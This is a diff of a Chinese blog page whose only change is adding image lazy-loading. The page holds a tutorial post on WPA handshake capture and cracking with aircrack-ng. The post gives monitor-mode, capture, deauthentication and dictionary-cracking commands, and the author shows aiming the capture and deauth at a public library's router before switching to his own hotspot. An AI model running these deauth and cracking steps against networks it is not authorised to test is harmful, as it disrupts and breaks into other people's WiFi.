@@ -223,7 +223,7 @@
             <div class="brand-logo">
                 <a href="/" class="waves-effect waves-light">
                     
-                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    <img src="/images/loading.gif" data-original="/medias/logo.png" class="logo-img" alt="LOGO">
                     
                     <span class="logo-span">他信了，他真的信了</span>
                 </a>
@@ -305,7 +305,7 @@
 
     <div class="mobile-head bg-color">
         
-        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        <img src="/images/loading.gif" data-original="/medias/logo.png" class="logo-img circle responsive-img">
         
         <div class="logo-name">他信了，他真的信了</div>
         <div class="logo-desc">
@@ -545,29 +545,29 @@
 <h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>首先我们先来看看网卡支不支持监听</p>
 <pre><code>airmon-ng
 </code></pre>
-<p><img src="/" title="点击并拖拽以移动"></p>
-<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f1a18e2f4664489fa95e5d6128337b39~tplv-k3u1fbpfcp-zoom-1.image"><img src="/" title="点击并拖拽以移动">​编辑</p>
+<p><img src="/images/loading.gif" data-original="/" title="点击并拖拽以移动"></p>
+<p><img src="/images/loading.gif" data-original="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f1a18e2f4664489fa95e5d6128337b39~tplv-k3u1fbpfcp-zoom-1.image"><img src="/images/loading.gif" data-original="/" title="点击并拖拽以移动">​编辑</p>
 <p> 可以看到我的两个网卡都是可以监听的</p>
 <pre><code>airmon-ng start wlan1
 </code></pre>
-<p><img src="/" title="点击并拖拽以移动"></p>
+<p><img src="/images/loading.gif" data-original="/" title="点击并拖拽以移动"></p>
 <p>我买的网卡是wlan1，大部分人应该都是wlan0，改一下就行</p>
-<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/feb9d18dde504b1fbe21bbd9966a11a8~tplv-k3u1fbpfcp-zoom-1.image"><img src="/" title="点击并拖拽以移动">​编辑</p>
+<p><img src="/images/loading.gif" data-original="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/feb9d18dde504b1fbe21bbd9966a11a8~tplv-k3u1fbpfcp-zoom-1.image"><img src="/images/loading.gif" data-original="/" title="点击并拖拽以移动">​编辑</p>
 <p> 开启监听以后，再次调用arimon时，发现网卡已经从wlan1变成了wlan1mon</p>
 <p>表示已经进入了监听模式</p>
 <p>当然，如果没变，也不是没进入监听模式，只不过后面敲命令时候注意把</p>
 <p>wlan1mon改成wlan1就行了</p>
 <h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>连接上图书馆的公共WIFI</p>
-<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0593b7b32aa14f159a5fff44a9bac98d~tplv-k3u1fbpfcp-zoom-1.image"><img src="/" title="点击并拖拽以移动">​编辑</p>
+<p><img src="/images/loading.gif" data-original="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0593b7b32aa14f159a5fff44a9bac98d~tplv-k3u1fbpfcp-zoom-1.image"><img src="/images/loading.gif" data-original="/" title="点击并拖拽以移动">​编辑</p>
 <p> 使用</p>
 <pre><code>airodump-ng wlan1mon
 </code></pre>
-<p><img src="/" title="点击并拖拽以移动"></p>
+<p><img src="/images/loading.gif" data-original="/" title="点击并拖拽以移动"></p>
 <p>扫描有哪些WIFI</p>
-<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0611fadabef04cc6b63b0029a7531ce3~tplv-k3u1fbpfcp-zoom-1.image"><img src="/" title="点击并拖拽以移动">​编辑</p>
+<p><img src="/images/loading.gif" data-original="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0611fadabef04cc6b63b0029a7531ce3~tplv-k3u1fbpfcp-zoom-1.image"><img src="/images/loading.gif" data-original="/" title="点击并拖拽以移动">​编辑</p>
 <p> 当然没截全部，MAC地址是能看到的</p>
 <p>定睛一看</p>
-<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/852b0f2d3f31450eb7df77e50ba94b56~tplv-k3u1fbpfcp-zoom-1.image"><img src="/" title="点击并拖拽以移动">​编辑</p>
+<p><img src="/images/loading.gif" data-original="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/852b0f2d3f31450eb7df77e50ba94b56~tplv-k3u1fbpfcp-zoom-1.image"><img src="/images/loading.gif" data-original="/" title="点击并拖拽以移动">​编辑</p>
 <p> 对不起了，亲爱的馆长</p>
 <blockquote>
 <p><code>airodump-ng -c 1 --bssid 路由器MAC地址 -w home wlan1mon</code></p>
@@ -581,20 +581,20 @@
 <p>看我红中把他踢下去(洪水攻击</p>
 <pre><code>aireplay-ng -0 100 -a 路由器mac地址 -c 目标设备的mac地址 wlan1mon
 </code></pre>
-<p><img src="/" title="点击并拖拽以移动"></p>
-<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ba506167e3504d3cbcbb6e8652bfa4f4~tplv-k3u1fbpfcp-zoom-1.image"><img src="/" title="点击并拖拽以移动">​编辑</p>
+<p><img src="/images/loading.gif" data-original="/" title="点击并拖拽以移动"></p>
+<p><img src="/images/loading.gif" data-original="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ba506167e3504d3cbcbb6e8652bfa4f4~tplv-k3u1fbpfcp-zoom-1.image"><img src="/images/loading.gif" data-original="/" title="点击并拖拽以移动">​编辑</p>
 <p>到这步，就该结束了， 在往下整我估计得被撵出去了</p>
 <p>往下接着讲实操</p>
 <h2 id="个人热点实操"><a href="#个人热点实操" class="headerlink" title="个人热点实操"></a>个人热点实操</h2><p>我们先扫WIFI</p>
-<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/10078364350e47bebc0196d17138a8b3~tplv-k3u1fbpfcp-zoom-1.image"><img src="/" title="点击并拖拽以移动">​编辑</p>
+<p><img src="/images/loading.gif" data-original="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/10078364350e47bebc0196d17138a8b3~tplv-k3u1fbpfcp-zoom-1.image"><img src="/images/loading.gif" data-original="/" title="点击并拖拽以移动">​编辑</p>
 <p> Pixel是我的热点，就打它</p>
-<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/34a04bbd6ffb43ea9b5ac6c0ee8c822c~tplv-k3u1fbpfcp-zoom-1.image"><img src="/" title="点击并拖拽以移动">​编辑</p>
+<p><img src="/images/loading.gif" data-original="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/34a04bbd6ffb43ea9b5ac6c0ee8c822c~tplv-k3u1fbpfcp-zoom-1.image"><img src="/images/loading.gif" data-original="/" title="点击并拖拽以移动">​编辑</p>
 <p> 等待抓包</p>
 <p> 这里省略踢下去再抓包的步骤</p>
-<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/899d2132e0e64b448352ac0499de4eec~tplv-k3u1fbpfcp-zoom-1.image"><img src="/" title="点击并拖拽以移动">​编辑</p>
+<p><img src="/images/loading.gif" data-original="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/899d2132e0e64b448352ac0499de4eec~tplv-k3u1fbpfcp-zoom-1.image"><img src="/images/loading.gif" data-original="/" title="点击并拖拽以移动">​编辑</p>
 <pre><code> aircrack -ng -a2 -b +mac地址 + -w + 字典文件 + 抓包资源（一般在桌面
 </code></pre>
-<p><img src="/" title="点击并拖拽以移动"></p>
+<p><img src="/images/loading.gif" data-original="/" title="点击并拖拽以移动"></p>
 <p>（我的评价是，不如py跑脚本</p>
 <p>​</p>
 
@@ -699,10 +699,10 @@
                         <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                     </ul>
                     <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                        <img src="/images/loading.gif" data-original="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                     </div>
                     <div id="wechat">
-                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                        <img src="/images/loading.gif" data-original="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                     </div>
                 </div>
             </div>
@@ -750,7 +750,7 @@
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="图书馆里坐一会，破解了馆长室的WIFI？(省流：标题党">
+                        <img src="/images/loading.gif" data-original="/medias/featureimages/5.jpg" class="responsive-img" alt="图书馆里坐一会，破解了馆长室的WIFI？(省流：标题党">
                         
                         <span class="card-title">图书馆里坐一会，破解了馆长室的WIFI？(省流：标题党</span>
                     </div>
@@ -796,7 +796,7 @@
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="18号分享（1）">
+                        <img src="/images/loading.gif" data-original="/medias/featureimages/11.jpg" class="responsive-img" alt="18号分享（1）">
                         
                         <span class="card-title">18号分享（1）</span>
                     </div>
@@ -1312,4 +1312,17 @@ $(function () {
     <script src="/libs/instantpage/instantpage.js" type="module"></script>
     
 
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false});</script><script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false});</script>
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a,i=c[o];e=function(){c=c.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,a=t.getAttribute("data-original"),n.onload=function(){t.src=a,t.removeAttribute("data-original"),e&&e()},t.src!==a&&(n.src=a))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this);</script><script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
